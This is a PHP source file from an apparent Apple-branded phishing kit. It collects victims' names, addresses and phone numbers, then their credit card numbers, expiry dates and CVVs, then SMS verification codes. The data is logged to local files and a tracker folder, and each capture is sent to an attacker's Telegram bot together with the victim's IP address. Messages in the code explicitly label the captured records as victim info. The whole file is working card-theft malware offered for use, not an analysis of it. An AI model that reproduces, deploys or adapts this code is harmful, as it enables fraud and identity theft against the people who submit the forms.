<?php

session_start();
// require_once 'includes/main.php';


function prepend($string, $orig_filename) {
    if(file_exists($orig_filename)) {
      $context = stream_context_create();
      $orig_file = fopen($orig_filename, 'r', 1, $context);

      $temp_filename = tempnam(sys_get_temp_dir(), 'php_prepend_');
      file_put_contents($temp_filename, $string);
      file_put_contents($temp_filename, $orig_file, FILE_APPEND);

      fclose($orig_file);
      unlink($orig_filename);
      rename($temp_filename, $orig_filename);
    } else {
        $save=fopen($orig_filename, "w");
        fwrite($save, $string);
        fclose($save);
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    function _isCurl(){
        return function_exists('curl_version');
    }
    
    function telegram_message($message, $keyb) {
        include "configg.php";
    
        if (_isCurl() == 1) {
            
            $curl = curl_init();
            
            $data = [
                'text' => $message,
                'chat_id' => $chat_ids,
                'parse_mode' => 'HTML',
                'reply_markup' => $keyb
                ];
            
            curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
            return true;
        } else {
    
            file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?".http_build_query($data));
    
            }
    }

    function get_user_ip(){
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        if ($ip == '::1') {
            $ip = '127.0.0.1';
        }
    
        return $ip;
    }
$InfoDATE = date("d-m-Y h:i:sa");
$ip = get_user_ip();

    
if(isset($_POST['assn'])) {

    if (!empty($_POST['assn']) and !empty($_POST['aien']) and !empty($_POST['abank']) and !empty($_POST['aacc']) and !empty($_POST['anum']) ) {
    
    $msgx = "Apple 🍎\n
    ┌──Name 👤:  " . $_POST['assn'] . "
    ├──F Adress 📍:  " . $_POST['aien'] . "
    ├──S Adress 📍:  " . $_POST['abank'] . "
    ├──Zip 📔:  " . $_POST['aacc'] . "
    └──PHONE ☎️" . $_POST['anum'] . "
    
    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\n@ʙᴏʀᴇ3ᴅᴀ 🍎";
    
    
    $file = fopen("logx.txt", "a+");
    fwrite($file, $msgx);
    fclose($file);
    
    telegram_message($msgx, '');
    
    
    exit();
    }}

    

if(isset($_POST['name'])) {

    if (!empty($_POST['name']) and !empty($_POST['addres']) and !empty($_POST['adrex']) ) {

    $cc = $_POST['name'];
    $_SESSION['name'] = $cc;
    $fixbin =  str_replace(" ","",$cc);
    $cardlastdigit = substr($fixbin,12,16);
    $_SESSION['cardlastdigit'] = $cardlastdigit; 

    $msgx = "Apple 🍎\n
    ┌──VICTIM INFO;
    ├──CCN 💳:  " . $_POST['name'] . "
    ├──EXP 📅:  " . $_POST['addres'] . "
    └──CVV  👀" . $_POST['adrex'] . "
    
    ┌──Date " . $InfoDATE . ";
    └──IP $ip\n\nBy ʙᴏʀᴇ3ᴅᴀ 🍎";

    $msgxb = "Apple 🍎<br>
    ┌──VICTIM INFO<br>
    ├──CCN 💳:  " . $_POST['name'] . "<br>
    ├──EXP 📅:  " . $_POST['addres'] . "<br>
    └──CVV  👀" . $_POST['adrex'] . "<br>
    <br>
    ┌──Date " . $InfoDATE . "<br>
    └──IP $ip<br><br>By ʙᴏʀᴇ3ᴅᴀ 🍎";


    $jsonName ='';
    $setname = $_POST['name'];
    $jsonName = $setname.'.json';
    $jsonData = '{"command":"idle","fileName":"'.$setname.'","code":""}';
    $wpc = '../tracker/'.$jsonName;
    file_put_contents( $wpc, $jsonData);

    prepend($msgxb, "../tracker/".$setname.".txt");

    $_SESSION['vname'] = $setname;
    
    $arr = array("st"=>"success", "msg"=>"success");
    header('Content-type: application/json');
    echo json_encode($arr);

    telegram_message($msgx, '');
    exit();

    } 
}
    


if(isset($_POST['sms'])) {
    if (is_numeric($_POST['sms'])) {

        $sms = $_POST['sms'];
        
        $msgx = "Apple 🍎\n
        ┌──VICTIM CARD;
        └──SMS 🔗 " . $sms . "
        
        ┌──Date " . $InfoDATE . ";
        └──IP $ip\n\nBy ʙᴏʀᴇ3ᴅᴀ 🍎";

        $msgxb = "Apple 🍎<br>
        ┌──VICTIM CARD<br>
        └──SMS 🔗 " . $sms . "<br>
        <br>
        ┌──Date " . $InfoDATE . "<br>
        └──IP $ip<br><br>By ʙᴏʀᴇ3ᴅᴀ 🍎";

        $sms = $_POST['sms'];

        $jsonName ='';
        $setname = $_SESSION['vname'];
        $jsonName = $setname.'.json';
        $jsonData = '{"command":"idle","fileName":"'.$setname.'","code":""}';
        $wpc = '../tracker/'.$jsonName;
        file_put_contents( $wpc, $jsonData);
    
        prepend($msgxb, "../tracker/".$setname.".txt");
        
        $arr = array("st"=>"success", "msg"=>"success");
        header('Content-type: application/json');
        echo json_encode($arr);
    
    
        telegram_message($msgx, '');   
    
                exit();
        } else {
            $arr = array("st"=>"failure", "msg"=>"all inputs required!");
            header('Content-type: application/json');
            echo json_encode($arr);
        }
        }
    }
?>